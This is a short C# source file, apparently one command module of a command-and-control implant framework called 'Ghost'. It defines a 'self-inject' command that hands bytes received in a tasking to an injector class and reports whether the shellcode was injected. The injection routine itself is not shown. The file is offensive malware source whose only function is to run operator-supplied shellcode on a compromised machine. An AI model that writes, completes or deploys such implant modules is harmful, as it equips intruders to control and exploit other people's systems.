using Ghost.Internal;
using Ghost.Models.Tasks;

namespace Ghost.Commands
{
    public class SelfInject : GhostCommand
    {
        public override string Name => "self-inject";

        public override string Execute(GhostTask task)
        {
            var injector = new SelfInjector();
            var success = injector.Inject(task.FileBytes);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}
